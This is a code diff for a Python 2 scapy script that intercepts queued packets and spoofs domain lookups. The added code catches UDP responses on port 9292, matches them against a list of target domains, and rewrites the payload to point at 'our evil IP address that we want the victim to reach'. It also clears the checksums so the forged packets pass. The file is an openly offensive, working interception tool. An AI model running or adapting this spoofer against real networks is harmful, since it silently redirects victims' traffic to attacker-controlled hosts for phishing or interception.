@@ -1,5 +1,6 @@
 #! /bin/python
 
+import re
 import subprocess
 import time
 from argparse import ArgumentParser
@@ -16,15 +17,17 @@ def parse_cli_args():
                         required=True,
                         metavar="TARGET DOMAIN",
                         dest="targets",
-                        help="Domain names that we want to spoof")
+                        help="Domain names that we want to spoof",
+                        type=str)
     parser.add_argument("-d", "--destined-domain",
-                        nargs=1,
+                        nargs='?',
                         required=True,
                         metavar="DESTINATION IP ADDRESS",
                         dest="dest",
-                        help="Our evil IP address that we want the victim to reach")
+                        help="Our evil IP address that we want the victim to reach",
+                        type=str)
     parser.add_argument("-l", "--local",
-                        nargs=1,
+                        nargs='?',
                         metavar="TRUE",
                         dest="local",
                         help="Use this option if this script is run locally")
@@ -41,13 +44,32 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
 
     # Filter interesting packet only
-    if scapy_packet.haslayer(scapy.Raw):
-        load = scapy_packet[Raw].load
-        # Check if this load is what we want to spoof
-        if load:
-            # if yes, modify the data
+    if scapy_packet.haslayer(scapy.UDP) and scapy_packet[scapy.UDP].sport == 9292:
+        load = scapy_packet[scapy.Raw].load
+        print "[+] Captured a packet whose payload is:\t", load
+        malicious_load = load.split(';')[:-1]
+        if_target = False
+
+        for target in args.targets:
+            if re.search(target, malicious_load[0]) is not None:
+                if_target = True
+                break
+
+        if if_target:
+            malicious_load.append(args.dest)
+            malicious_load = ';'.join(malicious_load)
+
+            print "[x] Poison the payload to:\t\t", malicious_load
+            scapy_packet[scapy.Raw].load = malicious_load
+
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].len
+            del scapy_packet[scapy.UDP].chksum
+
             packet.set_payload(str(scapy_packet))
-            pass
+        else:
+            print "[+] Let it pass..."
     packet.accept()
 
 
